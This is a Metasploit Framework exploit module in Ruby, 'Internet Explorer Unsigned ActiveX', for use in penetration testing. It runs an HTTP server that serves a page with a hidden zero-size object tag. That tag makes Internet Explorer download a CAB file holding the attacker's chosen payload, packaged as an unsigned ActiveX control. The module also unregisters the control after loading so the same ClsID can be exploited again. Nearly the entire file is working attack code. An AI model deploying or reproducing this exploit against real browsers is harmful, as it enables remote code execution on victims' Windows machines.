##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Internet Explorer Unsigned ActiveX',
      'Description'    => %q{
        This exploit delivers an ActiveX object containing the selected
      payload. It is recommended to use an x86 payload and target as
      currently even an x64 IE runs individual tabs as x86. The generated
      CAB file will try to register the ActiveX without administrative
      permissions. When the ActiveX is loaded it attempts to unregister
      the ActiveX component to allow future exploitation with the same
      ClsID. Browser must be configured to allow Download of unsigned
      ActiveX controls.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'
        ],
      'References'     =>
        [
        ],
      'DisclosureDate' => 'Sep 20 2010',
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'References'    =>
        [
            [ 'URL', "http://msdn.microsoft.com/en-us/library/dd433049(v=vs.85).aspx"]
        ],
      'DefaultTarget'  => 0))
  end

  def on_request_uri(cli, request)
    print_status("Request received for #{request.uri}");

    if request.uri.include? @cab
      p = regenerate_payload(cli);
      activex, @ocx = generate_payload_activex({ :code => p.encoded })
      send_response(cli, activex, {'Content-Type' => 'application/octet-stream'})
    else
      page  = %Q|
<html><head></head><body>
<object classid="clsid:56C04F88-9E36-434B-82A3-D552B81A8CB9" codebase="#{get_uri()}#{@cab}.cab" width=0 height=0 />
</body></html>
|
      send_response(cli, page, { 'Content-Type' => 'text/html' })
    end
  end

  def primer
    @cab = rand_text_alpha(rand(5)+8);
  end
end
